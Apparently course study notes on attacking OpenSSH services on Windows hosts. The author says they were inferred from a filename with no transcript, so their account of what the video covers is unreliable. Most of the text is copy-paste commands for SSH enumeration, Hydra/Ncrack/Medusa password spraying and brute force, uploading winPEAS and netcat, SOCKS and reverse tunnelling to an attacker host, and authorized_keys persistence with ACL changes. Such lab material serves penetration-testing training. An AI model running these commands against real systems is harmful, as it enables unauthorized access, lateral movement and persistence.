# 09 - Targeting OpenSSH

Note: No transcript was provided. The following summary is inferred conservatively from the filename and folder. The video is likely a practical, eJPT-level walkthrough of identifying and attacking OpenSSH services on Windows systems (OpenSSH for Windows), focusing on enumeration, credential attacks, logging in, file transfer, and SSH tunneling.

## What the video covers (Introduction / big picture)
- How to recognize and fingerprint OpenSSH exposed on a Windows target.
- Enumerating SSH service details: version, algorithms, and authentication methods.
- Credential attacks against SSH (password spraying/brute force) using standard tools.
- Gaining shell access to Windows over SSH and conducting initial post-compromise enumeration.
- Using SCP/SFTP to transfer tooling to a Windows host.
- Using SSH port forwarding and dynamic SOCKS proxying for pivoting.
- Persistence basics with SSH keys on Windows OpenSSH (if you obtain administrative access).

## Flow (ordered)
1. Discover SSH (port 22) and fingerprint the service/version.
2. Enumerate SSH algorithms and authentication methods to understand constraints.
3. Prepare user/password lists; consider account lockout policy.
4. Attempt password spraying or controlled brute force (Hydra/Ncrack/Medusa).
5. On success, SSH into the Windows host (cmd.exe or PowerShell).
6. Basic post-auth enumeration and situational awareness.
7. Transfer tooling with scp/sftp (e.g., winPEAS, nc64, seatbelt).
8. Set up SSH port forwarding/tunneling for RDP/HTTP/SMB pivoting.
9. Optional persistence with authorized_keys (if you have sufficient privileges).
10. Clean up and notes on logging/artifacts.

## Tools highlighted
- Nmap (service/version detection and SSH NSE scripts)
- Hydra, Ncrack, Medusa (credential attacks)
- ssh/ssh.exe, scp, sftp (access and file transfer)
- sshpass (non-interactive SSH with password)
- plink (Windows PuTTY command-line SSH client)
- proxychains (when using dynamic SOCKS tunneling)
- PowerShell and Windows built-ins (whoami, net, icacls, sc, Get-Service)

## Typical command walkthrough (detailed, copy-paste friendly)

Set a target variable (Kali/Linux attacker assumed):
```bash
export TARGET=10.10.10.10
```

1) Discovery and fingerprinting
```bash
# Quick check for SSH
nmap -p22 $TARGET

# Version detection and default scripts
nmap -sV -sC -p22 $TARGET

# Aggressive scan (may be noisy)
nmap -A -p22 $TARGET
```

2) SSH-specific enumeration
```bash
# Enumerate SSH algorithms (ciphers, MACs, KEX)
nmap --script ssh2-enum-algos -p22 $TARGET

# Grab host keys and fingerprints
nmap --script ssh-hostkey -p22 $TARGET

# Enumerate available authentication methods for a given username
# (use a likely username or a discovered one)
nmap --script ssh-auth-methods --script-args="ssh.user=administrator" -p22 $TARGET
```

3) Credential attacks (choose one tool)

Hydra – brute force/spray:
```bash
# Password spray: try one password across many users (safer for lockouts)
hydra -L users.txt -p Winter2024! -f -V -t 4 ssh://$TARGET

# Brute force: try many passwords per user (riskier)
hydra -L users.txt -P passwords.txt -f -V -t 4 ssh://$TARGET
```

Ncrack – optimized network auth cracking:
```bash
# Brute force with Ncrack
ncrack -v -T 3 -U users.txt -P passwords.txt ssh://$TARGET:22
```

Medusa – alternative:
```bash
medusa -h $TARGET -M ssh -U users.txt -P passwords.txt -t 4 -f -v 6
```

4) Login (Windows OpenSSH)
```bash
# Interactive SSH (accept host key automatically)
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@$TARGET

# Force password auth if key auth interferes
ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password user@$TARGET

# Get PowerShell directly
ssh -t user@$TARGET powershell

# If SSH is on a non-standard port
ssh -p 2222 user@$TARGET
```

5) Post-auth Windows recon (run after logging in)
```cmd
whoami
whoami /priv
hostname
ver
systeminfo
ipconfig /all
net user
net localgroup administrators
```

PowerShell equivalents:
```powershell
whoami
Get-ComputerInfo | Select-Object OsName, OsVersion, CsName
Get-NetIPConfiguration
Get-LocalUser
Get-LocalGroupMember -Group Administrators
```

6) File transfer to Windows (OpenSSH server)
```bash
# Upload a tool to Windows Temp
scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ./winPEASx64.exe user@$TARGET:C:/Windows/Temp/winPEASx64.exe

# SFTP interactive
sftp user@$TARGET
sftp> put ./nc64.exe C:/Windows/Temp/nc64.exe
sftp> ls C:/Windows/Temp/
```

7) Tunneling and pivoting
```bash
# Local port forward (access remote RDP locally as 127.0.0.1:3389)
ssh -N -L 3389:127.0.0.1:3389 user@$TARGET

# Local forward to an internal service via the SSH host
ssh -N -L 8080:INTERNAL-HOST:80 user@$TARGET

# Dynamic SOCKS proxy on 1080 for proxychains
ssh -N -D 1080 user@$TARGET
# Then configure /etc/proxychains.conf to use socks5 127.0.0.1 1080
# and run: proxychains nmap -sT -Pn INTERNAL-HOST

# Reverse tunnel (if you control the target to connect back to you)
ssh -N -R 8080:127.0.0.1:80 attacker@YOUR_PUBLIC_IP
```

8) Persistence with SSH keys (requires proper privileges)

Generate a key pair on attacker:
```bash
ssh-keygen -t ed25519 -f ~/.ssh/winkey -N ""
```

Add public key on the Windows host:

For an admin account (OpenSSH for Windows special file):
```powershell
# Run on the target with admin rights
New-Item -ItemType Directory -Path 'C:\ProgramData\ssh' -Force | Out-Null
$pub = Get-Content -Raw -Path '\\10.10.10.1\share\winkey.pub'  # or echo the key literal
$path = 'C:\ProgramData\ssh\administrators_authorized_keys'
$pub | Out-File -FilePath $path -Encoding ascii -Append

# Fix permissions (required for OpenSSH on Windows)
icacls $path /inheritance:r
icacls $path /grant "Administrators:F"
icacls $path /grant "SYSTEM:F"
```

For a standard user:
```powershell
$sshDir = "$env:USERPROFILE\.ssh"
New-Item -ItemType Directory -Path $sshDir -Force | Out-Null
$pub = Get-Content -Raw -Path '\\10.10.10.1\share\winkey.pub'
$path = "$sshDir\authorized_keys"
$pub | Out-File -FilePath $path -Encoding ascii -Append

icacls $sshDir /inheritance:r
icacls $sshDir /grant "$env:USERNAME:(OI)(CI)F" "SYSTEM:(OI)(CI)F"
icacls $path   /inheritance:r
icacls $path   /grant "$env:USERNAME:F" "SYSTEM:F"
```

Login with the key:
```bash
ssh -i ~/.ssh/winkey user@$TARGET
```

9) Compatibility tweaks (old servers)
```bash
# Connect to legacy OpenSSH with deprecated algorithms (only if needed)
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    -oCiphers=+aes128-cbc \
    user@$TARGET
```

10) Service checks and logs (on the target)
```powershell
# Check OpenSSH services on Windows
Get-Service sshd, ssh-agent
sc.exe qc sshd

# Logs (if enabled)
Get-ChildItem 'C:\ProgramData\ssh\logs\'
Get-Content 'C:\ProgramData\ssh\logs\sshd.log' -Tail 200
```

## Practical tips
- Respect account lockout policies. Prefer password spraying with a few well-chosen candidates over full brute force. Throttle attempts (e.g., Hydra -t 2, add delays).
- Always fingerprint first. Use ssh-auth-methods to see if password login is allowed before attacking.
- If login succeeds but you get no shell, try forcing PowerShell: ssh -t user@host powershell. Some configs are SFTP-only (ForceCommand internal-sftp).
- When adding authorized_keys on Windows, incorrect file permissions will break key logins; fix with icacls as shown.
- Use StrictHostKeyChecking=no and a throwaway UserKnownHostsFile during testing to avoid prompts and host key clutter.
- Prefer scp/sftp for stable transfers; Windows path with scp works as C:/Path/To/File.
- For pivoting, SSH -D with proxychains offers flexible internal enumeration through the SSH foothold.
- Avoid noisy NSE brute scripts by default; dedicated tools (Hydra/Ncrack) give better control and reporting.
- If SSH is moved off 22, nmap -p- first, then target the discovered port with ssh -p <port> and your cracking tool.

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Discover/fingerprint
export TARGET=10.10.10.10
nmap -sV -sC -p22 $TARGET
nmap --script ssh2-enum-algos,ssh-hostkey -p22 $TARGET
nmap --script ssh-auth-methods --script-args="ssh.user=administrator" -p22 $TARGET

# 2) Password spray / brute
hydra -L users.txt -p Winter2024! -f -V -t 3 ssh://$TARGET
# or
hydra -L users.txt -P passwords.txt -f -V -t 4 ssh://$TARGET

# 3) Login
ssh -o StrictHostKeyChecking=no user@$TARGET
# or force PowerShell
ssh -t user@$TARGET powershell

# 4) Transfer tools
scp ./winPEASx64.exe user@$TARGET:C:/Windows/Temp/winPEASx64.exe

# 5) Pivot
ssh -N -L 3389:127.0.0.1:3389 user@$TARGET     # RDP via local 3389
ssh -N -D 1080 user@$TARGET                    # SOCKS for proxychains

# 6) Key persistence (admin)
ssh-keygen -t ed25519 -f ~/.ssh/winkey -N ""
# then on target: write key to C:\ProgramData\ssh\administrators_authorized_keys and fix ACLs (icacls)
```

## Summary
- Targeting OpenSSH (even on Windows) is primarily about careful enumeration and credential access, not remote exploits.
- Use Nmap to fingerprint the service and auth methods, then execute controlled, policy-aware credential attacks with Hydra/Ncrack.
- With valid creds, SSH gives you a stable Windows shell, easy file transfer, and powerful tunneling for lateral movement.
- If you gain higher privileges, persist via authorized_keys with correct Windows ACLs.
- Keep noise low, monitor lockout risks, and leverage SSH tunneling to expand access safely and effectively.